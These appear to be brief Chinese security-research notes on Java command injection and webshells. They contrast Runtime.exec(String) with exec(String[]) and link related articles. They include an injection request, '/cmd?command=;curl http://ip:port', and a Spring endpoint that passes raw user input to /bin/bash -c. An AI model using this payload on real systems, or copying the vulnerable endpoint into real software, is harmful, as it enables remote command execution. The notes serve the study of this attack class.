# shell

偶然发现了一篇文章
>https://xz.aliyun.com/t/7798


+ [一种新型Java一句话木马的实现](https://xz.aliyun.com/t/9715)

## 命令执行的tips

https://www.anquanke.com/post/id/243329

https://xz.aliyun.com/t/7046

**其实说到底是java.lang.Runtime#exec(string)一个对命令进行了空格切分（导致切分不合本意），另一个string[]是自己去分离可以执行**

下面代码是可以执行的

/cmd?command=;curl http://ip:port

```java
@GetMapping(value = "/cmd")
public void cmd(@RequestParam String command) throws Exception {
    String[] c = { "/bin/bash","-c", "hacker "+ command };///bin/bash -c hacker;ls
    Process p = Runtime.getRuntime().exec(c);
}
```

下面是不能执行的
```java
Command = "ping 127.0.0.1"+request.getParameter("cmd");
Runtime.getRuntime().exec(command);
```
